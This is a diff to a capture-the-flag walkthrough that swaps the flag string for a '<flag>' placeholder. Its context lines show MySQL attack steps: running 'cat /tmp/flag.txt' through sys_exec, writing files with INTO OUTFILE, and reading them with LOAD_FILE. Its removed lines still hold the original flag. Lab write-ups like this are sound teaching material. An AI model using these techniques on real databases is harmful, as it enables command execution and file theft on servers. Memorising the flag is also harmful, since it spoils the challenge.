@@ -74,14 +74,14 @@ Use MySQL functions to execute system commands and access the file system.
    +----------------------------------+
    | sys_exec('cat /tmp/flag.txt')   |
    +----------------------------------+
-   | OCR{mssql_xp_cmdsh3ll}         |
+   | <flag>         |
    +----------------------------------+
    1 row in set (0.00 sec)
    ```
 
 2. **Method 2: Use INTO OUTFILE (write file):**
    ```sql
-   SELECT 'OCR{mssql_xp_cmdsh3ll}' INTO OUTFILE '/tmp/flag_output.txt';
+   SELECT '<flag>' INTO OUTFILE '/tmp/flag_output.txt';
    ```
 
    **Expected output:**
@@ -99,7 +99,7 @@ Use MySQL functions to execute system commands and access the file system.
    +---------------------------+
    | LOAD_FILE('/tmp/flag.txt')|
    +---------------------------+
-   | OCR{mssql_xp_cmdsh3ll}   |
+   | <flag>   |
    +---------------------------+
    1 row in set (0.00 sec)
    ```
@@ -130,7 +130,7 @@ Extract the flag from the command execution results.
 
 1. **The flag is in the query output:**
    ```
-   OCR{mssql_xp_cmdsh3ll}
+   <flag>
    ```
 
 2. **If using INTO OUTFILE, verify file was created:**
@@ -153,7 +153,7 @@ Ensure the flag is in the correct format before submission.
 
 **Flag format:**
 ```
-OCR{mssql_xp_cmdsh3ll}
+<flag>
 ```
 
 **Verification checklist:**
